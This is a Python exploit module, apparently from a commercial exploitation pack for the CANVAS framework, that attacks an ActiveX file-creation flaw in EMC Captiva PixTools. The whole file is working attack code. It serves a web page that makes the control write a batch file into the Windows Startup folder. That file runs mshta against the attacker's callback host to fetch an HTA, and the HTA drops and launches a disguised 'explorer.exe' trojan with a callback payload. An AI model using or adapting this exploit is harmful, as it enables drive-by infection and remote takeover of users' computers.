#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2009
#


import sys

if '.' not in sys.path: 
	sys.path.append('.')

from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from MOSDEF import pelib

import struct


# GUI info
NAME = "EMC Captiva PixTools Distributed Imaging ActiveX Arbitrary File Creation Vulnerability"

DESCRIPTION = "Arbitrary File Creation Vulnerability in EMC Captiva PixTools Distributed Imaging ActiveX"
DOCUMENTATION = {}
DOCUMENTATION["VENDOR"] = "EMC"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["Date public"] = "2009.10.01"
DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/36566"
DOCUMENTATION["Versions Affected"] = "EMC Captiva PDI SDK 2.2"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["CVE Name"] = "Unknown"
DOCUMENTATION["CVE Url"] = "Unknown"
DOCUMENTATION["Notes"] = ""

VERSION='1.0'

GTK2_DIALOG='dialog.glade2'

PROPERTY={}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Clientside'
PROPERTY['ARCH'] = [['Windows']]
PROPERTY['VERSION'] = ['XP']

NOTES="""
Usage:
.\commandlineInterface.py -p 5555 -v 1
.\exploits\httpserver\httpserver.py -v 9 -O singleexploit:d2sec_emcpdi -l 192.168.133.1 -d 5555 -p 80
"""

CHANGELOG="""
"""

targets = {    
    0:['Windows XP with IE'],
}

class theexploit(tcpexploit,httpclientside):
  def __init__(self):
    tcpexploit.__init__(self)
    httpclientside.__init__(self)
    self.clientversion = 1
    self.name = NAME
    self.trojanname = "index.hta" 
    self.filename = "index.html"
    return

  def file4hta(self, exename):
  	evilprog = "explorer.exe"
  	e = []
  	
  	for a in exename:
  		for b in a:
  			if b == "\r":
  			  d = "0d"
  			elif b == "\n":
  			  d = "0a"
  			elif b == "\0":
  			  d = "00"
  			else:
  			  c = hex(ord(b))
  			  d = c.replace("0x", "")
  			
  			if len(d) == 1:
  			  d = "0"+d
  			
  			e.append(d)
  	
  	i = 0
  	j = 0
  	l = len(e)
  	
  	hta = "<SCRIPT language=vbs>\n\n"
  	while 1:
  	  hta += " prog = prog & \""
  	
  	  while i != 24:
  	    hta += "%s," % e[j]
  	    if j == l-1:
  	      break
  	    i += 1
  	    j += 1
  	
  	  if j == l-1:
  	    hta = hta[:-1] + "\"\n\n"
  	    break
  	  hta += "\"\n"
  	  i = 0
  	
  	hta += " tmp = Split(prog, \",\")\n"	
  	hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
  	hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
  	hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
  	hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
  	hta += " Set f = fso.CreateTextFile(path, True)\n\n"
  	hta += " For i = 0 To UBound(tmp)\n"
  	hta += "   prog = Int(\"&H\" & tmp(i))\n"
  	hta += "   f.Write Chr(prog)\n"
  	hta += " Next\n\n"
  	hta += " f.Close\n"
  	hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
  	hta += " self.Close\n"
  	hta += "</SCRIPT>\n"
  	
  	return hta        

  def maketrojan(self):
    proxy_payload = ''

    try:
      if hasattr(self, 'HTTPMOSDEF') and self.HTTPMOSDEF == True:
        # make sure that fromcreatethread is set to 0 in your
        # httpserver/exploit listenerArgsDict!
        import shellcode.standalone.windows.payloads as payloads
        ssl_dict = { True : 'https', False : 'http' }
        print "XXX: self.useSSL ..." + str(self.useSSL)
        p   = payloads.payloads()
        sc  = p.http_proxy("%s://%s" %  (ssl_dict[self.useSSL], self.callback.ip), self.callback.port)
        proxy_payload = p.assemble(sc)
    except Exception,msg:
      import traceback
      traceback.print_exc(file=sys.stderr)
      proxy_payload = ''
            
    myPElib = pelib.PElib()
    
    self.mosdeftrojan = myPElib.createPEFileBuf(proxy_payload)
    
    self.log("Writing out %d bytes to %s" % (len(self.mosdeftrojan), self.trojanname))
    
    self.htafile = self.file4hta(self.mosdeftrojan)		
    file(self.trojanname, "wb").write(self.htafile)
    self.setInfo("%s - done" % (NAME))
    ret = len(self.mosdeftrojan) != 0
		
    return ret
     
     
  def makefile(self):
  
    filedata = """
<HTML> 
<BODY>
 
<DIV id="targetDiv">

</DIV>

<SCRIPT language="javascript">  

try {		
	var detect = new ActiveXObject("PDIControl.PDI.1");
	
	if (detect) {	
		document.getElementById("targetDiv").innerHTML = "<object classid='clsid:00200338-3D33-4FFC-AC20-67AA234325F3' id='target'></object>";	
			
	  target.SetLogLevel(1);
    target.SetLogFileName("C:\\\Documents and Settings\\\All Users\\\Start Menu\\\Programs\\\Startup\\\d2.bat");
    target.WriteToLog(1, "& mshta.exe MOSDEFTROJANURL")		
	}
}
catch(e) {}

</SCRIPT> 

</BODY> 
</HTML>        
"""        
    filedata = filedata.replace("MOSDEFTROJANURL", "http://" + self.callback.ip + "/" + self.trojanname)            
    return filedata

  def makesploit(self, clientheader, clientbody):        
    from libs.spkproxy import header, body
    h = header('SERVER')
    b = body()
    
    self.maketrojan()
    
    if clientheader.URL.count(self.filename):
      self.createShellcode()
      sploitstring = self.makefile()            
      b.setBody(sploitstring)
    elif clientheader.URL.count(self.trojanname):
      self.log("Sending MOSDEF trojan")
      f = open(self.trojanname, "rb")
      sploitstring = f.read()
      f.close()
      os.remove(self.trojanname)
      self.log("Sending %d bytes"%len(sploitstring))
      h.addHeader("Content-type","binary/octet-stream")
      h.addHeader("Connection","close")
      b.setBody(sploitstring)      
    else:
      self.log('Redirecting to self')
      h.status = '302'
      h.addHeader('Location', self.filename)
      h.addHeader('Content-Type', 'binary/octet-stream')
    return h, b

  def neededListenerTypes(self):
    from canvasengine import HTTPMOSDEF
    return [HTTPMOSDEF]
    
  def run(self):        
    return 1

if __name__=='__main__':
  print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
  app = theexploit()
  ret = standard_callback_commandline(app)
